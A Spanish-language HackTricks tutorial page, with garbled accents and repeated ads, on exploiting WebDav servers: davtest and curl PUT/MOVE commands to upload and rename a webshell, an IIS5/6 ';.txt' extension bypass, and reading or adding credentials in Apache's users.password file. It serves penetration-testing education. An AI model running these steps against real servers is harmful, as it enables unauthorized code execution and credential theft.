# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) para construir y **automatizar flujos de trabajo** f√°cilmente con las **herramientas comunitarias m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
{% endhint %}

Al tratar con un **servidor HTTP con WebDav** habilitado, es posible **manipular archivos** si tienes las **credenciales** correctas, generalmente verificadas a trav√©s de **HTTP Basic Authentication**. Obtener control sobre dicho servidor a menudo implica la **carga y ejecuci√≥n de un webshell**.

El acceso al servidor WebDav generalmente requiere **credenciales v√°lidas**, siendo el [**bruteforce de WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) un m√©todo com√∫n para adquirirlas.

Para superar las restricciones en las cargas de archivos, especialmente aquellas que impiden la ejecuci√≥n de scripts del lado del servidor, podr√≠as:

* **Cargar** archivos con **extensiones ejecutables** directamente si no est√°n restringidos.
* **Renombrar** archivos no ejecutables cargados (como .txt) a una extensi√≥n ejecutable.
* **Copiar** archivos no ejecutables cargados, cambiando su extensi√≥n a una que sea ejecutable.

## DavTest

**Davtest** intenta **cargar varios archivos con diferentes extensiones** y **verificar** si la extensi√≥n es **ejecutada**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

Esto no significa que **las extensiones .txt y .html se est√©n ejecutando**. Esto significa que puedes **acceder a estos archivos** a trav√©s de la web.

## Cadaver

Puedes usar esta herramienta para **conectarte al servidor WebDav** y realizar acciones (como **subir**, **mover** o **eliminar**) **manualmente**.
```
cadaver <IP>
```
## Solicitud PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Solicitud MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) para construir y **automatizar flujos de trabajo** f√°cilmente con las **herramientas** comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## Vulnerabilidad de WebDav en IIS5/6

Esta vulnerabilidad es muy interesante. El **WebDav** **no permite** **subir** o **renombrar** archivos con la extensi√≥n **.asp**. Pero puedes **eludir** esto **agregando** al final del nombre **";.txt"** y el archivo ser√° **ejecutado** como si fuera un archivo .asp (tambi√©n podr√≠as **usar ".html" en lugar de ".txt"** pero **NO olvides el ";"**).

Luego puedes **subir** tu shell como un archivo ".**txt"** y **copiar/moverlo a un archivo ".asp;.txt"**. Al acceder a ese archivo a trav√©s del servidor web, ser√° **ejecutado** (cadaver dir√° que la acci√≥n de mover no funcion√≥, pero s√≠ lo hizo).

![](<../../.gitbook/assets/image (1092).png>)

## Credenciales post

Si el Webdav estaba usando un servidor Apache, deber√≠as mirar los sitios configurados en Apache. Com√∫nmente:\
_**/etc/apache2/sites-enabled/000-default**_

Dentro podr√≠as encontrar algo como:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Como puedes ver, hay archivos con las **credenciales** v√°lidas para el servidor **webdav**:
```
/etc/apache2/users.password
```
Dentro de este tipo de archivos encontrar√°s el **nombre de usuario** y un **hash** de la contrase√±a. Estas son las credenciales que el servidor webdav est√° utilizando para autenticar a los usuarios.

Puedes intentar **crackearlas**, o **agregar m√°s** si por alguna raz√≥n deseas **acceder** al servidor **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Para verificar si las nuevas credenciales est√°n funcionando, puedes hacer:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Referencias

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)
{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las **herramientas comunitarias m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
